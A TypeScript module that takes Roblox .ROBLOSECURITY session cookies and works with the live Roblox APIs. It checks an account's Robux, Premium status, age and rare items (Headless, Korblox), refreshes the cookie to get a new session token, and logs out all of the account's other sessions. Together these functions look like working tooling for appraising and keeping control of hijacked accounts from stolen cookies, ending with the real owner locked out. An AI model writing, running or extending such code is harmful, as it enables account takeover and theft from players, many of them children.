import axios from 'axios';

export interface ValidateResult {
  valid: boolean;
  username?: string;
  displayName?: string;
  userId?: number;
  robux?: number;
  isPremium?: boolean;
  accountAgeDays?: number;
  hasHeadless?: boolean;
  hasKorblox?: boolean;
  debug: string;
}

export interface RefreshResult {
  newCookie: string | null;
  status: string;
  debug: string;
}

// ─── Helpers ───────────────────────────────────────────────────────────────

function cookieHeader(cookie: string) {
  return {
    Cookie: `.ROBLOSECURITY=${cookie.trim()}`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  };
}

function makeLogger() {
  const lines: string[] = [];
  return {
    log: (msg: string) => { lines.push(msg); console.log('[ROBLOX]', msg); },
    dump: () => lines.join('\n'),
  };
}

// ─── Validate ─────────────────────────────────────────────────────────────

export async function validateCookie(cookie: string): Promise<ValidateResult> {
  const { log, dump } = makeLogger();
  const trimmed = cookie.trim();

  try {
    const authResp = await axios.get('https://users.roblox.com/v1/users/authenticated', {
      headers: cookieHeader(trimmed),
      validateStatus: () => true,
    });

    if (authResp.status !== 200) {
      log(`Auth failed: ${authResp.status}`);
      return { valid: false, debug: dump() };
    }

    const { id: userId, name: username, displayName } = authResp.data as {
      id: number; name: string; displayName: string;
    };
    log(`Authenticated: ${username} (${userId})`);

    const hdrs = cookieHeader(trimmed);
    const [currencyResp, premiumResp, userResp, headlessResp, korbloxResp] = await Promise.all([
      axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`,                    { headers: hdrs, validateStatus: () => true }),
      axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: hdrs, validateStatus: () => true }),
      axios.get(`https://users.roblox.com/v1/users/${userId}`,                               { validateStatus: () => true }),
      axios.get(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/474`,          { headers: hdrs, validateStatus: () => true }),
      axios.get(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/48545806`,      { headers: hdrs, validateStatus: () => true }),
    ]);

    const robux         = currencyResp.status === 200 ? (currencyResp.data?.robux as number) : undefined;
    const isPremium     = premiumResp.status  === 200 ? Boolean(premiumResp.data) : undefined;
    const hasHeadless   = headlessResp.status === 200 ? (headlessResp.data?.data?.length ?? 0) > 0 : undefined;
    const hasKorblox    = korbloxResp.status  === 200 ? (korbloxResp.data?.data?.length  ?? 0) > 0 : undefined;

    let accountAgeDays: number | undefined;
    if (userResp.status === 200 && userResp.data?.created) {
      accountAgeDays = Math.floor((Date.now() - new Date(userResp.data.created).getTime()) / 86_400_000);
    }

    log(`Robux:${robux} Premium:${isPremium} Age:${accountAgeDays}d Headless:${hasHeadless} Korblox:${hasKorblox}`);
    return { valid: true, username, displayName, userId, robux, isPremium, accountAgeDays, hasHeadless, hasKorblox, debug: dump() };

  } catch (err: any) {
    log(`Exception: ${err.message}`);
    return { valid: false, debug: dump() };
  }
}

// ─── Soft refresh (preserves other sessions) ──────────────────────────────

export async function refreshCookie(cookie: string): Promise<RefreshResult> {
  const { log, dump } = makeLogger();
  const trimmed = cookie.trim();
  const baseHeaders = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    Cookie: `.ROBLOSECURITY=${trimmed}`,
  };

  try {
    // Step 1: harvest CSRF token
    log('POST /v2/session/refresh — harvesting CSRF');
    const csrfResp = await axios.post(
      'https://auth.roblox.com/v2/session/refresh',
      {},
      { headers: baseHeaders, validateStatus: () => true },
    );
    log(`CSRF probe status: ${csrfResp.status}`);

    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
    if (!csrf) {
      if (csrfResp.status === 401) return { newCookie: null, status: 'COOKIE_EXPIRED', debug: dump() };
      return { newCookie: null, status: `CSRF_FAILED_${csrfResp.status}`, debug: dump() };
    }
    log(`CSRF: ${csrf.slice(0, 16)}…`);

    // Step 2: actual refresh
    log('POST /v2/session/refresh — with CSRF');
    const refreshResp = await axios.post(
      'https://auth.roblox.com/v2/session/refresh',
      {},
      { headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf }, validateStatus: () => true },
    );
    log(`Refresh status: ${refreshResp.status}`);

    if (refreshResp.status === 200) {
      const newCookie = extractNewCookie(refreshResp.headers['set-cookie'], trimmed);
      if (newCookie) { log(`New cookie obtained (${newCookie.length} chars)`); return { newCookie, status: 'SUCCESS', debug: dump() }; }
      log('200 OK but no new cookie in Set-Cookie');
      return { newCookie: null, status: 'SUCCESS_NO_COOKIE', debug: dump() };
    }

    log(`Refresh failed: ${refreshResp.status}`);
    return { newCookie: null, status: `ERROR_${refreshResp.status}`, debug: dump() };

  } catch (err: any) {
    log(`Exception: ${err.message}`);
    return { newCookie: null, status: `EXCEPTION`, debug: dump() };
  }
}

// ─── Kill all sessions (logout + reauthenticate) ──────────────────────────

export async function killSessions(cookie: string): Promise<RefreshResult> {
  const { log, dump } = makeLogger();
  const trimmed = cookie.trim();
  const baseHeaders = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    Cookie: `.ROBLOSECURITY=${trimmed}`,
  };

  try {
    // Step 1: harvest CSRF token
    log('POST /v2/logoutfromallsessionsandreauthenticate — harvesting CSRF');
    const csrfResp = await axios.post(
      'https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate',
      {},
      { headers: baseHeaders, validateStatus: () => true },
    );
    log(`CSRF probe status: ${csrfResp.status}`);

    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
    if (!csrf) {
      if (csrfResp.status === 401) return { newCookie: null, status: 'COOKIE_EXPIRED', debug: dump() };
      return { newCookie: null, status: `CSRF_FAILED_${csrfResp.status}`, debug: dump() };
    }
    log(`CSRF: ${csrf.slice(0, 16)}…`);

    // Step 2: actual kill
    log('POST /v2/logoutfromallsessionsandreauthenticate — with CSRF');
    const killResp = await axios.post(
      'https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate',
      {},
      { headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf }, validateStatus: () => true },
    );
    log(`Kill status: ${killResp.status}`);

    if (killResp.status === 200) {
      // May also return a new cookie (ignore it — caller already has the refreshed one)
      log('Sessions killed successfully');
      return { newCookie: null, status: 'SUCCESS', debug: dump() };
    }

    log(`Kill failed: ${killResp.status}`);
    return { newCookie: null, status: `ERROR_${killResp.status}`, debug: dump() };

  } catch (err: any) {
    log(`Exception: ${err.message}`);
    return { newCookie: null, status: `EXCEPTION`, debug: dump() };
  }
}

// ─── Internal helpers ─────────────────────────────────────────────────────

function extractNewCookie(setCookie: string[] | string | undefined, oldCookie: string): string | null {
  if (!Array.isArray(setCookie)) return null;
  for (const raw of setCookie) {
    const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
    if (match && match[1] !== oldCookie) return match[1];
  }
  return null;
}
